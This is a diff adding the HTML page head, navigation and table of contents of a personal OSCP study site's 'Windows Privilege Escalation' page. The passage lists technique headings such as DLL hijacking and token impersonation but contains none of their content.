@@ -1,0 +1,2717 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://thatguy9358.github.io/OSCP-Notes/Windows_Priv_Esc.html">
+      
+      
+        <link rel="prev" href="Windows_Commands.html">
+      
+      
+        <link rel="next" href="python_notes.html">
+      
+      
+        
+      
+      
+      <link rel="icon" href="assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Windows Privilege Escalation - My site</title>
+      
+    
+    
+      <link rel="stylesheet" href="assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="light-green" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#windows-privilege-escalation" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="index.html" title="My site" class="md-header__button md-logo" aria-label="My site" data-md-component="logo">
+      
+  <img src="assets/logo2.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Windows Privilege Escalation
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="index.html" title="My site" class="md-nav__button md-logo" aria-label="My site" data-md-component="logo">
+      
+  <img src="assets/logo2.png" alt="logo">
+
+    </a>
+    My site
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Active_Directory.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Client_Side_Attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client Side Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Gotcha%27s.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Gotcha's
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Information_Gathering.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Gathering
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Linux_Priv_Esc.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Linux_commands.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Locating_and_fixing_public_exploits.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Locating and Fixing Public Exploits
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Metasploit_Framework.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploit Framework
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mind%20Map.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mind Map
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Note_taking_and_Report_writing.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Note Taking and Report Writing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Password_attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Password Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Playbook.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Playbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Port_Redirecting_and_Tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Port Redirecting and Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Recon.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recon
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Resources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Resources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerability_Scanning.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vulnerability Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Web_Application_Attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Application Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Windows_Commands.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="Windows_Priv_Esc.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#privileges-and-access-control-mechanisms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privileges and Access Control Mechanisms
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privileges and Access Control Mechanisms">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#security-identifier" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Identifier
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#access-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Access Tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-account-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Account Control
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-apps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumerate Apps
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hidden-in-plain-view" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hidden in Plain View
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hidden in Plain View">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dictionary-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Dictionary Files
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sticky-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sticky Notes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#other-files-of-interest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other files of interest
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#clipboard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CLipboard
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#inspecting-powershell-logs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Inspecting Powershell Logs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#inspecting-procceses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Inspecting procceses
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Inspecting procceses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#powershell-saved-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Powershell saved credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automating-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automating Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kernel Exploits
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#service-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service exploits
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Service exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#insecure-service-properties" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Insecure Service properties
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unquoted-service-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unquoted Service Path
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#weak-registry-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Weak registry Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#insecure-service-executables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Insecure Service Executables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dll-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DLL Hijacking
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DLL Hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#writing-malicious-dll" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Writing Malicious DLL
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disable-safe-load-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        disable safe load mode
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#registry-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Registry exploits
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Registry exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#auto-run" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Auto run
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#msi-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MSI files
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#passwords" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Passwords
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Passwords">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#saved-creds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        saved creds
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#config-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        config files
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SAM
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass the hash
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scheduled Tasks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gui-apps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GUI Apps
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#startup-apps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Startup Apps
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installed-apps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        installed apps
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hot-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hot Potato
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#token-impersonation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Token Impersonation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Token Impersonation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rotten-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rotten Potato
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#juicy-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Juicy Potato
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rogue-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rogue Potato
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#printspoofer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Printspoofer
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Forwarding
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Strategy
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#named-pipes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Named Pipes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getsystem" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Getsystem
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#abusing-user-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Abusing User privileges
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uac-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UAC Bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="python_notes.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Python Notes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#privileges-and-access-control-mechanisms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privileges and Access Control Mechanisms
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privileges and Access Control Mechanisms">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#security-identifier" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Identifier
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#access-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Access Tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-account-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Account Control
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-apps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumerate Apps
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hidden-in-plain-view" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hidden in Plain View
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hidden in Plain View">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dictionary-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Dictionary Files
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sticky-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sticky Notes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#other-files-of-interest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other files of interest
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#clipboard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CLipboard
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#inspecting-powershell-logs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Inspecting Powershell Logs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#inspecting-procceses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Inspecting procceses
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Inspecting procceses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#powershell-saved-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Powershell saved credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automating-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automating Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kernel Exploits
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#service-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service exploits
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Service exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#insecure-service-properties" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Insecure Service properties
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unquoted-service-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unquoted Service Path
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#weak-registry-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Weak registry Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#insecure-service-executables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Insecure Service Executables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dll-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DLL Hijacking
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DLL Hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#writing-malicious-dll" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Writing Malicious DLL
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disable-safe-load-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        disable safe load mode
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#registry-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Registry exploits
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Registry exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#auto-run" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Auto run
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#msi-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MSI files
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#passwords" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Passwords
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Passwords">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#saved-creds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        saved creds
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#config-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        config files
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SAM
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass the hash
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scheduled Tasks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gui-apps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GUI Apps
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#startup-apps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Startup Apps
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installed-apps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        installed apps
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hot-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hot Potato
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#token-impersonation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Token Impersonation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Token Impersonation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rotten-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rotten Potato
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#juicy-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Juicy Potato
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rogue-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rogue Potato
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#printspoofer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Printspoofer
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Forwarding
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Strategy
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#named-pipes" class="md-nav__link">
